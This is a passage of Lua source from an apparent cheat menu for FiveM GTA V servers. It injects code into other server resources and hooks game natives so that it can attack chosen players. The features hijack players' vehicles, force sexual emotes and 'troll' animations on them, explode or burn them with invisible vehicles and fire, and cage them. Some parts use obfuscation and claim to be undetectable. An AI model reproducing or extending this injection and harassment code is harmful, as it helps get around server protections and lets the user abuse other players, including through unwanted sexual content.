                                                local jitter = (math.random(-20, 20) / 100)

                                                for _, data in ipairs(_G.TitanObjs) do
                                                    if DoesEntityExist(data.ent) then
                                                        local worldPos = GetOffsetFromEntityInWorldCoords(ped, data.off.x + jitter, data.off.y + jitter, -0.5)
                                                        
                                                        SetEntityCoordsNoOffset(data.ent, worldPos.x, worldPos.y, worldPos.z, false, false, false)
                                                        SetEntityRotation(data.ent, rotation, rotation, rotation, 2, true)
                                                        
                                                        ApplyForceToEntity(data.ent, 1, 0, 0, 0.1, 0, 0, 0, 0, true, true, true, false, true)
                                                    end
                                                end
                                                Wait(0)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "Bug Player V2", "Extreme Bug Injected!", 3000)
                                else
                                    MachoInjectResource(targetSafeRes, [[
                                        _G.TitanBugActive = false
                                        if _G.TitanObjs then
                                            for _, data in ipairs(_G.TitanObjs) do
                                                if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                            end
                                        end
                                        _G.TitanObjs = nil
                                    ]])
                                    self:Notify("info", "Bug Player V2", "Bug Cleaned", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fly Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetId = targetPlayers[1]
                                if checked then
                                    MachoInjectResource(targetSafeRes, string.format([[
                                        _G.FlyVehicle = true
                                        local targetServerId = %d
                                        local player = PlayerPedId()

                                        if not _G.OriginalCoords then
                                            _G.OriginalCoords = GetEntityCoords(player)
                                        end

                                        local function RequestControl(entity, timeoutMs)
                                            timeoutMs = timeoutMs or 600
                                            local start = GetGameTimer()
                                            while (GetGameTimer() - start) < timeoutMs do
                                                if NetworkHasControlOfEntity(entity) then return true end
                                                NetworkRequestControlOfEntity(entity)
                                                Wait(0)
                                            end
                                            return NetworkHasControlOfEntity(entity)
                                        end

                                        local function HijackDriverSeat(vehicle)
                                            if not DoesEntityExist(vehicle) then return nil end
                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                                            
                                            SetEntityVisible(player, false, false)
                                            SetEntityAlpha(player, 0, false)
                                            RequestControl(vehicle, 250)

                                            if driver ~= 0 and driver ~= player then
                                                RequestControl(driver, 250)
                                                DeletePed(driver)
                                                Wait(50)
                                            end

                                            TaskWarpPedIntoVehicle(player, vehicle, -1)
                                            Wait(50)
                                            return vehicle
                                        end

                                        local function GetCameraDirection()
                                            local rot = GetGameplayCamRot(2)
                                            local pitch, yaw = math.rad(rot.x), math.rad(rot.z)
                                            local cosPitch = math.cos(pitch)
                                            return vector3(-math.sin(yaw) * cosPitch, math.cos(yaw) * cosPitch, math.sin(pitch))
                                        end

                                        local function FlyWhereYouLook(vehicle, speed)
                                            if not DoesEntityExist(vehicle) then return end
                                            RequestControl(vehicle, 50)
                                            local direction = GetCameraDirection()
                                            SetEntityVelocity(vehicle, direction.x * speed, direction.y * speed, direction.z * speed)
                                            local rot = GetEntityRotation(vehicle, 2)
                                            SetEntityRotation(vehicle, 0.0, 0.0, rot.z, 2, true)
                                        end

                                        CreateThread(function()
                                            while _G.FlyVehicle do
                                                local targetPlayer = GetPlayerFromServerId(targetServerId)
                                                if targetPlayer ~= -1 then
                                                    local targetPed = GetPlayerPed(targetPlayer)
                                                    if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                                        local targetVehicle = GetVehiclePedIsUsing(targetPed)
                                                        if DoesEntityExist(targetVehicle) then
                                                            local hijackedVehicle = HijackDriverSeat(targetVehicle)
                                                            if hijackedVehicle then
                                                                local flySpeed = 50.0
                                                                while _G.FlyVehicle and IsPedInVehicle(player, hijackedVehicle, false) do
                                                                    FlyWhereYouLook(hijackedVehicle, flySpeed)
                                                                    Wait(0)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                                Wait(200)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "WTP", "Target Hijacked!", 3000)
                                else
                                    MachoInjectResource(targetSafeRes, [[
                                        _G.FlyVehicle = false
                                        local player = PlayerPedId()

                                        if _G.OriginalCoords then
                                            SetEntityCoords(player, _G.OriginalCoords.x, _G.OriginalCoords.y, _G.OriginalCoords.z, false, false, false, false)
                                            _G.OriginalCoords = nil -- Reset for next time
                                        end

                                        SetEntityVisible(player, true, false)
                                        ResetEntityAlpha(player)
                                        SetEntityCollision(player, true, true)
                                    ]])
                                    self:Notify("info", "WTP", "Returned to Last Position", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Emotes" },
                        {
                            type = "scrollable", 
                            label = "Force", 
                            desc = "This force an emote to the target player.", 
                            scrollType = "onEnter", 
                            value = 1,
                            values = { "Spooning", "Receive Blowjob", "Cowgirl", "Doggystyle Male 2", "Missionary" },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local EmoteList = {
                                    ["Spooning"] = {
                                        Label      = "Spooning",
                                        Command    = "sex11",
                                        Dictionary = "zmdev@erotica_spooningm",
                                        Animation  = "spooningm",
                                        OtherEmote = "sex12"
                                    },
                                    ["Receive Blowjob"] = {
                                        Label      = "Receive Blowjob",
                                        Command    = "sreceiveblowjob",
                                        Dictionary = "misscarsteal2pimpsex",
                                        Animation  = "pimpsex_punter",
                                        OtherEmote = "sgiveblowjob"
                                    },
                                    ["Cowgirl"] = {
                                        Label      = "Cowgirl",
                                        Command    = "sex13",
                                        Dictionary = "zmdev@erotica_standingcowgirlm",
                                        Animation  = "standingcowgirlm",
                                        OtherEmote = "sex14"
                                    },
                                    ["Doggystyle Male 2"] = {
                                        Label      = "Doggystyle Male 2",
                                        Command    = "sex7",
                                        Dictionary = "zmdev@erotica_doggystyle2m",
                                        Animation  = "doggystyle2m",
                                        OtherEmote = "sex8"
                                    },
                                    ["Missionary"] = {
                                        Label      = "Doggystyle Male 2",
                                        Command    = "sex3",
                                        Dictionary = "zmdev@erotica_missionary2m",
                                        Animation  = "missionary2m",
                                        OtherEmote = "sex4"
                                    }
                                }

                                local targetId = targetPlayers[1]
                                local d = EmoteList[value]
                                if not d then return end

                                executeCode("any", string.format([[
                                    local maxDistance = 15.0
                                    local myCoords    = GetEntityCoords(PlayerPedId())

                                    local danceData = {
                                        Label      = %q,
                                        Command    = %q,
                                        Dictionary = %q,
                                        Animation  = %q,
                                        Synchronized = true,
                                        Options = {
                                            Flags  = { Loop = true },
                                            Shared = { OtherEmote = %q }
                                        }
                                    }

                                    local otherEmoteData = {
                                        Label      = "Synchronized Dance",
                                        Command    = %q,
                                        Dictionary = %q,
                                        Animation  = %q,
                                        Synchronized = true,
                                        Options = {
                                            Flags  = { Loop = true },
                                            Shared = { OtherEmote = %q }
                                        }
                                    }
                                    local targetPlayer = %d
                                    local targetPed = GetPlayerPed(targetPlayer)
                                    if DoesEntityExist(targetPed) then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(myCoords - targetCoords)
                                        if distance <= maxDistance then
                                            local targetServerId = GetPlayerServerId(targetPlayer)
                                            WTP.SafeRunNative(TriggerServerEvent, 'scully_emotemenu:requestSynchronizedEmote',  targetServerId, danceData, otherEmoteData)
                                            WTP.SafeRunNative(TriggerServerEvent, 'scully_emotemenu:synchronizedEmoteResponse', targetServerId, danceData, otherEmoteData)
                                        end
                                    end
                                ]], targetId, d.Label, d.Command, d.Dictionary, d.Animation, d.OtherEmote, d.Command, d.Dictionary, d.Animation, d.OtherEmote))
                            end
                        },
                        {
                            type = "scrollable-checkbox",
                            label = "Emote Troll",
                            checked = false,
                            value = 1,
                            values = {"Twerk On Them", "Give Them Backshots", "Blame Arrest", "Blame Carry", "Piggy Back", "Pasan", "Blow Driver"},
                            onSelect = function(selectedValue, checked)
                                if checked then
                                    local targets = {}
                                    for serverId, isSelected in pairs(CPlayers) do
                                        if isSelected then
                                            table.insert(targets, serverId)
                                        end
                                    end

                                    if #targets == 0 then
                                        self:Notify("error", "WTP", "Select a player first!", 3000)
                                        return
                                    end

                                    local actionName = type(selectedValue) == "string" and selectedValue or "Unknown"

                                    for _, targetId in ipairs(targets) do
                                        if actionName == "Twerk On Them" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "switch@trevor@mocks_lapdance"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                    WTP.SafeRunNative(TaskPlayAnim, playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Give Them Backshots" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "rcmpaparazzo_2"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, playerPed, targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                    WTP.SafeRunNative(TaskPlayAnim, playerPed, dict, "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                                    WTP.SafeRunNative(TaskPlayAnim, targetPed, dict, "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Blame Arrest" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "mp_arresting"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                    WTP.SafeRunNative(TaskPlayAnim, PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Blame Carry" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "nm"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                                    WTP.SafeRunNative(TaskPlayAnim, PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Piggy Back" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "anim@arena@celeb@flat@paired@no_props@"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                                    WTP.SafeRunNative(TaskPlayAnim, PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)

                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Pasan" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "anim@heists@fleeca_bank@hostages@intro"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                                    WTP.SafeRunNative(TaskPlayAnim, PlayerPedId(), "anim@heists@fleeca_bank@hostages@intro", "intro_loop_ped_a", 8.0, -8.0, 1000000, 33, 0, false, false, false)

                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Blow Driver" then
                                            executeCode("any", string.format([[
                                                WTP.SafeRunNative(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "mini@prostitutes@sexnorm_veh"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTP.SafeRunNative(Wait, 0) end

                                                    WTP.SafeRunNative(AttachEntityToEntity, playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                                    WTP.SafeRunNative(TaskPlayAnim, playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTP.SafeRunNative(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DetachEntity, playerPed, true, false)
                                                    WTP.SafeRunNative(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        end
                                        -- Add other elseif actionName == "..." then blocks here
                                    end

                                    self:Notify("success", "WTP", "Action: " .. tostring(actionName) .. " started!", 3000)
                                else
                                    executeCode("any", [[
                                        TrollingActive = false
                                        WTP.SafeRunNative(DetachEntity, PlayerPedId(), true, false)
                                        WTP.SafeRunNative(ClearPedTasks, PlayerPedId())
                                    ]])
                                end
                            end
                        },
                    }
                },
                {
                    label = "Risky",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Method 1", "Method 2", "Method 3"}, label = "Explode Player",
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Method 1" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        MachoHookNative(0x6ADAABD3068C5235, function(ped)
                                            return false, true
                                        end)
                                        MachoInjectResource(targetRes, [[
                                            CreateThread(function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = GetPlayerPed(targetPlayer)
                                                if not DoesEntityExist(ped) then return end
                                                local coords = GetEntityCoords(ped)
                                                local model = GetHashKey("sultan")
                                                RequestModel(model)
                                                while not HasModelLoaded(model) do
                                                    Wait(0)
                                                end
                                                local veh = CreateVehicle(model, coords.x, coords.y + 10, coords.z, 0.0, true, false)
                                                SetEntityVisible(veh, false, false)
                                                AddVehiclePhoneExplosiveDevice(veh)
                                                Wait(1000)
                                                SetEntityCoords(veh, GetEntityCoords(ped), true, true, true)
                                                Wait(100)
                                                DetonateVehiclePhoneExplosiveDevice(veh)
                                                NetworkRequestControlOfEntity(veh)
                                                Wait(400)
                                                DeleteEntity(veh)
                                            end)
                                        ]])
                                    end
                                elseif value == "Method 2" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        MachoInjectResource(targetRes, [[
                                            CreateThread(function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = GetPlayerPed(targetPlayer)
                                                if not DoesEntityExist(ped) then return end

                                                local veh = GetHashKey("volatus")
                                                RequestModel(veh)
                                                while not HasModelLoaded(veh) do
                                                    Wait(0)
                                                end

                                                local coords = GetEntityCoords(ped)
                                                local vehh = CreateVehicle(veh, coords.x, coords.y, coords.z + 30 , 0.0, true, true)
                                                Wait(1000)
                                                SetEntityVisible(vehh, false, false)
                                                SetVehicleEngineHealth(vehh, -4000.0)
                                                SetVehicleBodyHealth(vehh, 0.0)
                                                SetVehicleFuelLevel(vehh, 1000.0)
                                                SetEntityVelocity(vehh, 0.0, 0.0, -80.0)
                                                Wait(400)
                                                DeleteEntity(vehh)
                                            end)
                                        ]])
                                    end
                                elseif value == "Method 3" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        MachoInjectResource(targetRes, [[
                                            CreateThread(function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = GetPlayerPed(targetPlayer)
                                                if not DoesEntityExist(ped) then return end
                                                local coords = GetEntityCoords(ped)
                                                local model = "prop_aircon_m_04"
                                                RequestModel(model)
                                                while not HasModelLoaded(model) do Wait(0) end

                                                local obj = CreateObjectNoOffset(model, coords.x, coords.y, coords.z - 1.0, true, true, false)
                                                if not DoesEntityExist(obj) then return end
                                                
                                                NetworkRegisterEntityAsNetworked(obj)
                                                local netId = ObjToNet(obj)
                                                SetNetworkIdExistsOnAllMachines(netId, true)
                                                SetNetworkIdCanMigrate(netId, true)
                                                
                                                PlaceObjectOnGroundProperly(obj)
                                                SetEntityVisible(obj, false, false)
                                                SetEntityCollision(obj, false, false)
                                                FreezeEntityPosition(obj, true)
                                                
                                                local pos = GetEntityCoords(obj)
                                                local fireIds = {}
                                                local offsets = {
                                                    {0.0, 0.0, 0.0},
                                                    {0.35, 0.0, 0.0},
                                                    {-0.35, 0.0, 0.0},
                                                    {0.0, 0.35, 0.0},
                                                    {0.0, -0.35, 0.0},
                                                }
                                                
                                                for i=1, #offsets do
                                                    local off = offsets[i]
                                                    local id = StartScriptFire(pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
                                                    if id and id ~= -1 then
                                                        fireIds[#fireIds+1] = id
                                                    end
                                                end
                                                
                                                local entFire = StartEntityFire(obj)
                                                
                                                local timeout = GetGameTimer() + 10000
                                                while GetGameTimer() < timeout and DoesEntityExist(obj) do
                                                    Wait(200)
                                                end
                                                
                                                for i=1, #fireIds do
                                                    RemoveScriptFire(fireIds[i])
                                                end
                                                
                                                if entFire and entFire ~= -1 then
                                                    RemoveScriptFire(entFire)
                                                end
                                                StopEntityFire(obj)
                                                
                                                if DoesEntityExist(obj) then
                                                    DeleteObject(obj)
                                                end
                                                
                                                SetModelAsNoLongerNeeded(model)
                                            end)
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "button", label = "Silent Explosion", desc = 'Explode player completely UD.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                MachoInjectResource(targetSafeRes, string.format([[
                                    local ped = GetPlayerPed(GetPlayerFromServerId(%d))
                                    local coords = GetEntityCoords(ped)
                                    local model = GetHashKey("sultan")
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do
                                        Wait(0)
                                    end
                                    local veh = CreateVehicle(model, coords.x, coords.y + 10, coords.z, 0.0, false, false)
                                    SetEntityVisible(veh,false,false)
                                    SetEntityAsNoLongerNeeded(veh)
                                    SetEntityVisible(veh,false,false)
                                    SetVehicleAsNoLongerNeeded(veh)
                                    SetEntityVisible(veh,false,false)
                                    Wait(1000)
                                    SetEntityCoords(veh, GetEntityCoords(ped) ,true, true, true)
                                    Wait(100)
                                    NetworkExplodeVehicle(veh, true, true, true)
                                    Wait(200)
                                    NetworkRequestControlOfEntity(veh)
                                    DeleteEntity(veh)
                                ]], targetID))
                            end
                        },
                        { type = "button", label = "Cage Player", desc = 'This will cage the target.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                MachoInjectResource(targetSafeRes, string.format([[
                                    Citizen.CreateThread(function()
                                        local awidaowdhoa = {
                                            ["GetHashKey"] = GetHashKey,
                                            ["RequestModel"] = RequestModel,
                                            ["GetGameTimer"] = GetGameTimer,
                                            ["HasModelLoaded"] = HasModelLoaded,
                                            ["Wait"] = Citizen.Wait,
                                            ["GetActivePlayers"] = GetActivePlayers,
                                            ["GetPlayerServerId"] = GetPlayerServerId,
                                            ["GetPlayerPed"] = GetPlayerPed,
                                            ["DoesEntityExist"] = DoesEntityExist,
                                            ["GetEntityCoords"] = GetEntityCoords,
                                            ["CreateObject"] = CreateObject,
                                            ["SetEntityAsMissionEntity"] = SetEntityAsMissionEntity,
                                            ["FreezeEntityPosition"] = FreezeEntityPosition,
                                            ["AttachEntityToEntity"] = AttachEntityToEntity,
                                            ["SetModelAsNoLongerNeeded"] = SetModelAsNoLongerNeeded
                                        }

                                        local sid = %d
                                        local modelName = "prop_container_ld_pu"
                                        local model = awidaowdhoa["GetHashKey"](modelName)

                                        awidaowdhoa["RequestModel"](model)
                                        local timeout = awidaowdhoa["GetGameTimer"]() + 5000
                                        while not awidaowdhoa["HasModelLoaded"](model) and awidaowdhoa["GetGameTimer"]() < timeout do
                                            awidaowdhoa["Wait"](10)
                                        end
                                        
                                        if not awidaowdhoa["HasModelLoaded"](model) then return end

                                        local function getPedBySid(s)
                                            for _, pid in ipairs(awidaowdhoa["GetActivePlayers"]()) do
                                                if awidaowdhoa["GetPlayerServerId"](pid) == s then 
                                                    return awidaowdhoa["GetPlayerPed"](pid) 
                                                end
                                            end
                                            return 0
                                        end

                                        local targetPed = getPedBySid(sid)
                                        if targetPed ~= 0 and awidaowdhoa["DoesEntityExist"](targetPed) then
                                            local coords = awidaowdhoa["GetEntityCoords"](targetPed)
                                            local obj = awidaowdhoa["CreateObject"](model, coords.x, coords.y, coords.z - 1.0, true, true, false)
                                            
                                            if obj ~= 0 and awidaowdhoa["DoesEntityExist"](obj) then
                                                awidaowdhoa["SetEntityAsMissionEntity"](obj, true, true)
                                                awidaowdhoa["FreezeEntityPosition"](obj, true)
                                            end
                                        end
                                        awidaowdhoa["SetModelAsNoLongerNeeded"](model)
                                    end)
                                ]], targetID))
                                self:Notify("success", "WTP", "Attempting to cage Player", 5000)
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        { type = "button", label = "Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleClonePlayer(targetPlayers)
                                self:Notify("success", "WTP", "Cloned Player", 5000)
                            end
                        },
                        { type = "button", label = "Attack Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleAttackClonePlayer(targetPlayers)
                                self:Notify("success", "WTP", "Cloned Player", 5000)
                            end
                        },
                        { type = "divider", label = "Object Options" },
                        {
                            type = "scrollable",
                            label = "Attach Prop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_barrel_02a", "prop_cone_float_1", "prop_chair_01a", "prop_boombox_01",
                                "prop_tool_broom", "prop_golf_ball", "prop_laptop_01a", "prop_trafficcone_01a",
                                "prop_pizza_box_01", "prop_mb_cargo_01a", "prop_ld_crate_01a", "prop_ld_fueldoor",
                                "prop_ld_greenscreen_01", "prop_ld_shovel", "prop_snow_bottle", "prop_snow_locker_01",
                                "prop_dummy_01", "prop_dummy_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTP:GetSelectedObjectModel()
                                    return value
                                end

                                WTP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Furniture",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_table_01", "prop_table_02", "prop_table_03", "prop_chair_02",
                                "prop_chair_03", "prop_chair_04a", "prop_sofa_01", "prop_sofa_02",
                                "prop_sofa_03", "prop_bed_01", "prop_bed_02", "prop_lamp_01",
                                "prop_lamp_02", "prop_lamp_03", "prop_couch_01", "prop_couch_02",
                                "prop_tv_01", "prop_tv_02", "prop_tv_03", "prop_computer_01",
                                "prop_computer_02", "prop_monitor_01", "prop_monitor_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
